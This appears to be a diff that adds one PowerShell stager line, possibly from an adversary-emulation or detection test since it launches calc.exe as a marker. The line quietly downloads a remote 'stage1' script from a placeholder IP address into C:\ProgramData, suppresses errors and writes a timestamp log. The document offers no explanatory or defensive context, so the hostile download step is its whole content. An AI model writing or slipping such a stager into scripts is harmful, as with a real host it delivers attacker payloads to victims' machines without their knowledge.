@@ -1,0 +1,1 @@
+$Stage1Url = 'http://203.0.113.217/stage1.ps1'; $DropPath = "C:\ProgramData\stage1.bin"; $TimeoutSec = 46; Start-BitsTransfer -Source $Stage1Url -Destination $DropPath -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
